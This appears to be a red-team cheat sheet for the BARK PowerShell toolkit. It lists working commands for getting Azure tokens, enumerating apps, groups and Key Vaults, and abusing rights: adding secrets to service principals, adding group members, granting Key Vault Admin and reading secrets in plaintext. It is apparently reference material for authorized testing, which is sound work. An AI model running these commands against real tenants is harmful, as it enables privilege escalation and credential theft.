# Using BARK

## What is BARK
BloodHound Attack Research Kit ([BARK](https://github.com/BloodHoundAD/BARK/blob/main/README.md)) is used for authenticating and performing abuse primitives in Azure and Azure AD

## Installation
BARK is a PowerShell script:
* `git clone https://github.com/BloodHoundAD/BARK.git` or download the PowerShell script
* Import the module with `ipmo .\BARK.ps1`

## About Acquired Tokens
* Token objects may have multiple tokens (e.g. `access_token`, `refresh_token`, `id_token`)
	* Display contents of token objects with `$token`
	* If multiple tokens, use `$token.access_token` to auth with the access token

## Auth Commands
* Get a Graph API token with user/pass, then view the token
	* `$token = Get-MSGraphTokenWithUsernamePassword -Username "user@tenant.onmicrosoft.com" -Password "password" -Tenant "tenant.onmicrosoft.com"`
* Auth with with user and pass to get a refresh token, then use to get a Graph token
	* Get the PRT `$RefreshToken = Get-AZRefreshTokenWithUsernamePassword -username "user@tenant.onmicrosoft.com" -password "password" -TenantID "tenant.onmicrosoft.com"`
	* Get a Graph token `$MSGraphToken = Get-MSGraphTokenWithRefreshToken -RefreshToken $RefreshToken.refresh_token -TenantID "tenant.onmicrosoft.com"`
	* Get ARM tokens with:
		* `Get-ARMTokenWithUsernamePassword`
		* `Get-AzureRMTokenWithClientCredentials -ClientID "AppIdGoesHere" -ClientSecret "ClientSecretGoesHere" -TenantName "tenant.onmicrosoft.com"`
* Get a token scoped to Key Vault
	* With Client Creds
		* `$VaultToken = Get-AzureKeyVaultTokenWithClientCredentials -ClientID "AppIdGoesHere" -ClientSecret "ClientSecretGoesHere" -TenantName "tenant.onmicrosoft.com"`
* Use the access token with BARK cmdlets with `-Token $RefreshToken.access_token`

### Lateral Movement
* BARK is PowerShell:
	* Just request a new token to a new object
	* BARK functions support specifying the token with `-Token`

## Enumeration Commands
* List all apps, retrieve the ID of an app to then set a secret (with `New-AppRegSecret`)
	* `Get-AllAzureADApps -token $token.access_token | Select DisplayName,Id, AppId`
		* `Id` is the `AppRegObjectId`
		* `AppId` is what appears as the Object ID in BloodHound
* Retrieve members of a group
	* `Get-AZGroupMembers -GroupID "GroupIDGoesHere" -Token $token`
		* The Group ID is the `Object ID` property in BloodHound
* Find all Azure RM subscriptions
	* `Get-AllAzureRMSubscriptions -token $ARMtoken.access_token`
* Find all Key Vaults in an Azure RM Subscription
	* `Get-AllAzureRMKeyVaults -Token $ARMtoken.access_token -SubscriptionID "SubscriptionIdGoesHere"`
* Find Azure RM Role Definitions (e.g. Key Vault Administrators)
	* `Get-AzureRMRoleDefinitions -Token $ARMtoken.access_token -SubscriptionID "SubScriptionIdGoesHere" | ?{$_.AzureRMRoleDisplayName -Like "Key Vault Administrator"}`
* List secrets in a Key Vault
	* `Get-AzureRMKeyVaultSecrets -KeyVaultURL "https://[vaulturl].vault.azure.net/" -Token $VaultToken.access_token`

##  Abuse Commands
* Set a Service Principal secret (abuse AzAddSecret edge)
	* `New-ServicePrincipalSecret -ServicePrincipalID "ServicePrincipalIDGoesHere" -token $RefreshToken.access_token`
* Set an App Registration Secret (abusing AzAppAdmin role)
	* `New-AppRegSecret -AppRegObjectID "OBJECTIDHERE" -Token $token`
* Add a user to an existing group (abusing Owner privileges over a Group)
	* `Add-AZMemberToGroup -PrincipalID "IdOfMemberToAdd" -TargetGroupId "IdOfGroupOwned" -Token $token`
		* The Group ID is the `Object ID` property in BloodHound
* Grant Key Vault Admin over a target Key Vault
	* `New-AzureRMRoleAssignment -PrincipalId "ObjectIdOfUserToGrantAccess" -AzureRMRoleId "RoleId including /subscriptions endpoint" -TargetObjectId "Vault ObjectId without /subscriptions endpoint" -Token $ARMtoken.access_token`
* Retrieve a secret in plaintext from a Key Vault
	* `Get-AzureRMKeyVaultSecretValue -KeyVaultSecretID "SecretId" -token $vaulttoken.access_token`